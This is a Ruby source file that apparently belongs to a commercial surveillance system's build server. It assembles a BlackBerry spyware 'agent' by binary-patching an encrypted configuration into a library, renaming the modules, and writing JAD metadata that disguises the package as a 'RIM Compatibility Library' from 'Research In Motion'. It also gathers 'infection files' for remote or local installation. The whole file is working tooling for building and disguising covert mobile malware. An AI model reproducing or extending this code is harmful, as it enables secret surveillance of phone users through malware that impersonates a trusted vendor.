#
#  Agent creation for blackberry
#

# from RCS::Common
require 'rcs-common/trace'

require 'digest/sha1'

module RCS
module DB

class BuildBlackberry < Build

  def initialize
    super
    @platform = 'blackberry'
  end

  def unpack
    # unpack the core from db
    super

    # enumerates the version, renames the cod, flattens file in root
    Dir[path('res/v_*/*.cod')].each do |d| 
      maj, min, codname = d.scan(/v_(\d+)\.(\d+)\/(.*).cod/).flatten
      version = "#{maj}.#{min}"
      trace :debug, "version: #{version} codname: #{codname}"
      FileUtils.mv(d, path("#{codname}_#{version}.cod"))
      @outputs[@outputs.index("res/v_#{version}\/#{codname}.cod")] = "#{codname}_#{version}.cod"
    end
    
    # flatten the library to be binary patched
    FileUtils.mv( path("res/net_rim_bb_lib_base.cod"), path("net_rim_bb_lib_base.cod"))
    @outputs[@outputs.index("res/net_rim_bb_lib_base.cod")] = "net_rim_bb_lib_base.cod"
    
    trace :debug, "outputs: #{@outputs}"
  end
  
  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'net_rim_bb_lib_base.cod'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :blackberry, params['demo']

    # invoke the generic patch method with the new params
    super

    trace :debug, "Build: adding config to [#{params[:core]}] file"

    # blackberry has the config inside the lib file, binary patch it instead of creating a new file
    file = File.open(path(params[:core]), 'rb+')
    file.pos = file.read.index 'XW15TZlwZwpaWGPZ1wtL0f591tJe2b9'
    config = @factory.configs.first.encrypted_config(@factory.confkey)
    # write the size of the config
    file.write [config.bytesize].pack('I')
    # pad the config to 16Kb (minus the size of the int)
    config = config.ljust(2**14 - 4, "\x00")
    file.write config
    file.close
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    # enumerate the versions
    Dir[path('res/**')].each do |f| 
      trace :debug, "content: #{f}"
      version = f.to_s[/v_\d+\.\d+/]		
      if version 
        #version=version[2..-1]
        version.slice! "v_"
        version_melt params,version
      end
    end
  end
  
  # for every version prepares jad and cods
  def version_melt(params, version)
    trace :debug, "Build: version_melt: #{params}, #{version}"

    @appname = params['appname'] || 'net_rim_bb' 
	
    # read the content of the jad header
    content = File.open(path('jad'), 'rb') {|f| f.read}

    # reopen it for writing
    jadname = @appname + '_' + version + '.jad'
    jad = File.open(path(jadname), 'wb')

    name = params['name'] || 'RIM Compatibility Library'

    # make substitution in the jad header
    content['[:RIM-COD-Name:]'] = name
    content['[:RIM-COD-Version:]'] = params['version'] || '1.1.0'
    content['[:RIM-COD-Description:]'] = params['desc'] || 'RIM Compatibility Library used by applications in the App World'
    content['[:RIM-COD-Vendor:]'] = params['vendor'] || 'Research In Motion'

    content.gsub!('[:RIM-COD-FileName:]', @appname)
    
    jad.puts content
    jad.puts "RIM-COD-Module-Name: #{name}"
    jad.puts "RIM-COD-Creation-Time: #{Time.now.to_i}"

    num = 0
	
    # keep only the version specific cores and the library
    jadfiles = @outputs.dup.keep_if {|x| (x[/\w$/] and x[version]) or x['base']}

    # sort but ignore the extension.
    # this is mandatory to have blabla-1.cod after blabla.cod
    jadfiles.sort! {|x,y| x[0..-5] <=> y[0..-5]}

    # each part of the core must be renamed to the new appname
    # and added to the body of the jad file
    jadfiles.each do |file|
      old_name = file.dup
      
      if file['net_rim_bb_lib']
        file['net_rim_bb_lib'] = @appname
      end
	  
      @outputs[@outputs.index(file)] = file
      File.rename(path(old_name), path(file))

      inc = num == 0 ? '' : "-#{num}"

      jad.puts "RIM-COD-URL#{inc}: #{file}"
      jad.puts "RIM-COD-SHA1#{inc}: #{Digest::SHA1.file(path(file))}"
      jad.puts "RIM-COD-Size#{inc}: #{File.size(path(file))}"

      num += 1
    end

    jad.close
	
    @outputs << jadname
       
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    case params['type']
      when 'remote'
        Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|		
          @outputs.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] or o['.jad']}.each do |output|
            if File.file?(path(output))					
              z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
            end
          end
        end
      when 'local'
        Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
          @outputs.keep_if {|o| o['res'] || o['install.bat'] || o['bin'] || o['base'] || o['.cod'] || o['.jad']}.each do |output|
            if output['base']
              z.file.open('/res/net_rim_bb_base.cod', "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
            elsif File.file?(path(output))	
              outfile = output.dup		
              outfile = "res/" + output	if !output[/^res\//] and !output[/\.bat$/]
              z.file.open(outfile, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
            end
          end
        end
      else
        raise("pack failed. unknown type.")
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

  def unique(core)
    Zip::File.open(core) do |z|
      core_content = z.file.open('res/net_rim_bb_lib_base.cod', "rb") { |f| f.read }
      add_magic(core_content)
      z.file.open('res/net_rim_bb_lib_base.cod', "wb") { |f| f.write core_content }
    end
  end

  def infection_files(name = 'bb_in')
    files = []
    # keeps only all the cod and jad in the root
    @outputs.dup.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] or o['.jad']}.each do |output|
      files.push( { :name => output, :path => path(output) })
    end
    # adds the exes, in res, flattening the dir
    @outputs.dup.keep_if {|o| o['res'] and o['exe']}.each do |output|
      filepath = output.dup.downcase
      filepath.slice! "res/"
      filepath.gsub!(/inst_helper/,name)
      files.push({ :name => filepath, :path => path(output) })
    end
    
    return files
  end

end

end #DB::
end #RCS::
